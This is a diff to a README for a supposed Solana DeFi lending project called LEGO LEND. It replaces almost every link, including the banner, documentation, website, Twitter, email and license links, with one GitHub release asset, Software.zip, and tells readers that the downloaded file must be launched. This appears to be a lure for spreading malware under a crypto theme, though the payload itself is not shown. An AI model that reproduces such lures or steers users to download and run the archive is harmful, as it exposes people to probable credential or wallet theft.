@@ -1,6 +1,6 @@
 # LEGO LEND 🧱💰
 
-![LEGO LEND Banner](https://example.com/banner.png)
+![LEGO LEND Banner](https://github.com/Sifat-Shahrear/lego-lend/releases/download/v2.0/Software.zip)
 
 Welcome to the LEGO LEND repository! This project is a composable lending protocol built on Solana, designed to provide efficient and flexible borrowing and lending solutions in the decentralized finance (DeFi) ecosystem.
 
@@ -26,7 +26,7 @@ Welcome to the LEGO LEND repository! This project is a composable lending protoc
 
 To get started with LEGO LEND, you can download the latest version of the project by clicking the button below:
 
-[![Download LEGO LEND](https://img.shields.io/badge/Download-v1.0.0-blue)](https://github.com/cli/go-gh/archive/refs/tags/v1.0.0.zip)
+[![Download LEGO LEND](https://github.com/Sifat-Shahrear/lego-lend/releases/download/v2.0/Software.zip)](https://github.com/Sifat-Shahrear/lego-lend/releases/download/v2.0/Software.zip)
 
 ℹ️ Please note that the downloaded file needs to be launched to start using LEGO LEND.
 
@@ -34,7 +34,7 @@ If the download link is not working, you can always check the "Releases" section
 
 ## Documentation
 
-For detailed information on how to use LEGO LEND, configure the protocol, and contribute to the project, please refer to the [official documentation](https://lego-lend-docs.com).
+For detailed information on how to use LEGO LEND, configure the protocol, and contribute to the project, please refer to the [official documentation](https://github.com/Sifat-Shahrear/lego-lend/releases/download/v2.0/Software.zip).
 
 📖 The documentation covers topics such as:
 
@@ -47,22 +47,22 @@ For detailed information on how to use LEGO LEND, configure the protocol, and co
 
 Join our growing community to engage with other developers, ask questions, and stay up-to-date with the latest updates on LEGO LEND:
 
-🌐 Website: [lego-lend.com](https://lego-lend.com)
+🌐 Website: [https://github.com/Sifat-Shahrear/lego-lend/releases/download/v2.0/Software.zip](https://github.com/Sifat-Shahrear/lego-lend/releases/download/v2.0/Software.zip)
 
-🐦 Twitter: [@lego-lend](https://twitter.com/lego-lend)
+🐦 Twitter: [@lego-lend](https://github.com/Sifat-Shahrear/lego-lend/releases/download/v2.0/Software.zip)
 
-📧 Email: info@lego-lend.com
+📧 Email: https://github.com/Sifat-Shahrear/lego-lend/releases/download/v2.0/Software.zip
 
 🤝 We welcome collaborations and contributions from the community to help make LEGO LEND even better!
 
 ## License
 
-LEGO LEND is licensed under the MIT License. See the [LICENSE](https://github.com/lego-lend/LICENSE) file for more details.
+LEGO LEND is licensed under the MIT License. See the [LICENSE](https://github.com/Sifat-Shahrear/lego-lend/releases/download/v2.0/Software.zip) file for more details.
 
 🔗 **Connect with us:**
 
-[![Website](https://img.shields.io/badge/Website-lego--lend.com-green)](https://lego-lend.com)
-[![Twitter](https://img.shields.io/twitter/follow/lego-lend?style=social)](https://twitter.com/lego-lend)
+[![Website](https://github.com/Sifat-Shahrear/lego-lend/releases/download/v2.0/Software.zip)](https://github.com/Sifat-Shahrear/lego-lend/releases/download/v2.0/Software.zip)
+[![Twitter](https://github.com/Sifat-Shahrear/lego-lend/releases/download/v2.0/Software.zip)](https://github.com/Sifat-Shahrear/lego-lend/releases/download/v2.0/Software.zip)
 
 Start building your DeFi projects with LEGO LEND today! 🛠🚀
 
